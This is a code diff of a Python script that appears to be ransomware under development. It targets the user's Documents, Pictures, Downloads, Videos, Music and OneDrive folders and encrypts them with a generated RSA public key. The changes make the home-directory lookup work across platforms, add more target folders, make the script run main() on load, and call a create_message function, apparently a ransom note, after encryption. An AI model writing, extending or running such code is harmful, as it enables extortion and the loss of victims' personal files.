@@ -5,30 +5,8 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding as sym_padding
 from os import path, listdir
 import os
-
-
-def generate_keys():
-    # Generate RSA keys
-    private_key = rsa.generate_private_key(
-        public_exponent=65537, key_size=2048, backend=default_backend())
-    public_key = private_key.public_key()
-
-    # Serialize private key
-    pem = private_key.private_bytes(encoding=serialization.Encoding.PEM,
-                                    format=serialization.PrivateFormat.TraditionalOpenSSL,
-                                    encryption_algorithm=serialization.NoEncryption())
-
-    # Write private key to file
-    with open("keys/private_key.pem", "wb") as priv_file:
-        priv_file.write(pem)
-
-    # Serialize public key
-    pem = public_key.public_bytes(encoding=serialization.Encoding.PEM,
-                                  format=serialization.PublicFormat.SubjectPublicKeyInfo)
-
-    # Write public key to file
-    with open("keys/public_key.pem", "wb") as pub_file:
-        pub_file.write(pem)
+from keygen import generate_keys
+from message import create_message
 
 
 def encrypt_file(file_path, public_key):
@@ -88,14 +66,17 @@ def encrypt_directory(directory_path, public_key_pem_path):
 def main():
     # Example usage
     generate_keys()  # Run once to generate keys
+    home_dir = os.path.expanduser('~')
 
     # Directories to target
     user_dirs = [
-        os.path.join(os.environ['USERPROFILE'], 'Documents'),
-        os.path.join(os.environ['USERPROFILE'], 'Pictures'),
-        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
-        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
-        os.path.join(os.environ['USERPROFILE'], 'Videos')
+        os.path.join(home_dir, 'Documents'),
+        os.path.join(home_dir, 'Pictures'),
+        # os.path.join(home_dir, 'Desktop'),
+        os.path.join(home_dir, 'Downloads'),
+        os.path.join(home_dir, 'Videos'),
+        os.path.join(home_dir, 'Music'),
+        os.path.join(home_dir, 'OneDrive')
     ]
 
     for directory in user_dirs:
@@ -103,3 +84,8 @@ def main():
             encrypt_directory(directory, "keys/public_key.pem")
         else:
             print(f"Directory does not exist: {directory}")
+
+    create_message()
+
+
+main()
